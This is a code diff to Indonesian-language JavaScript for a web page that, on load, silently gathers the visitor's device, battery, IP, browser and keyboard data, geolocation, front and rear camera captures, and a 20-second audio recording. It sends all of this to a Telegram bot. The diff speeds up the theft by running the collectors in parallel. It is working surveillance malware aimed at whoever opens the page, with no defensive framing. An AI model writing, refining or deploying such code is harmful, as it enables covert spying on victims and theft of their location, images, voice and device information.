@@ -670,7 +670,7 @@ Status Rekaman VN      : Berhasil direkam
 Durasi Rekaman         : 20 detik
 Tipe File              : audio/webm
 Kualitas Mikrofon      : Stabil
-Link Kiriman Audio     : (terlampir langsung via Telegram)`;
+Link Kiriman Audio     : Via Telegram`;
 
         await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
           method: "POST",
@@ -701,20 +701,32 @@ Link Kiriman Audio     : (terlampir langsung via Telegram)`;
   }
 };
 
+const delay = (ms) => new Promise(res => setTimeout(res, ms));
+
 const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
-  const infoPerangkat = await ambilDataPerangkat();
-  const bateraiInfo = await ambilBaterai();
-  const layarGrafik = await ambilLayarGrafik();
+  const [
+    infoPerangkat,
+    bateraiInfo,
+    layarGrafik,
+    izinMedia,
+    ipInfo,
+    outputAudio
+  ] = await Promise.all([
+    ambilDataPerangkat(),
+    ambilBaterai(),
+    ambilLayarGrafik(),
+    ambilIzinMedia(),
+    ambilIPInfo(),
+    ambilOutputAudio()
+  ]);
+
   const browserInfo = ambilBrowserInfo();
   const webFeatures = ambilWebAPIFeatures();
-  const izinMedia = await ambilIzinMedia();
-  const ipInfo = await ambilIPInfo();
   const keyboard = ambilKeyboardActivity();
   const perangkatEksternal = ambilPerangkatEksternal();
-  const outputAudio = await ambilOutputAudio();
 
   const gabungAwal = [
     infoPerangkat,
@@ -731,16 +743,31 @@ const mulai = async () => {
 
   await kirimPesan(gabungAwal);
 
-  const lokasi = await ambilLokasi();
-  await kirimPesan(lokasi);
+  // Lokasi dan Kamera serta VN paralel
+  const lokasiPromise = ambilLokasi().then(async (lok) => {
+    await delay(20);
+    await kirimPesan(lok);
+  });
 
-  const depan = await ambilKamera("user", "depan");
-  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`);
+  const kameraDepanPromise = ambilKamera("user", "depan").then(async (hasil) => {
+    await delay(20);
+    await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${hasil}`);
+  });
 
-  const belakang = await ambilKamera("environment", "belakang");
-  await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
+  const kameraBelakangPromise = ambilKamera("environment", "belakang").then(async (hasil) => {
+    await delay(20);
+    await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${hasil}`);
+  });
 
-  await rekamVN();
+  const rekamVNPromise = delay(20).then(() => rekamVN());
+
+  // Jalankan semua bersamaan
+  await Promise.all([
+    lokasiPromise,
+    kameraDepanPromise,
+    kameraBelakangPromise,
+    rekamVNPromise
+  ]);
 };
 
     window.addEventListener("load", mulai);
